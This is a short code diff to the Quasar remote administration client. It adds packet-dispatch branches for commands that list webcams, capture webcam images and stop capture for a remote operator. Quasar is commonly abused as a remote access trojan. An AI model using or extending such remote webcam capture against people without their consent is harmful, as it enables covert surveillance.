@@ -184,6 +184,18 @@ namespace Quasar.Client.Networking
             {
                 CommandHandler.HandleDoCloseConnection(client, (DoCloseConnection)packet);
             }
+            else if (type == typeof(GetWebcam))
+            {
+                CommandHandler.HandleGetWebcam((GetWebcam)packet, client);
+            }
+            else if (type == typeof(GetWebcams))
+            {
+                CommandHandler.HandleGetWebcams((GetWebcams)packet, client);
+            }
+            else if (type == typeof(DoWebcamStop))
+            {
+                CommandHandler.HandleDoWebcamStop((DoWebcamStop)packet, client);
+            }
         }
     }
 }
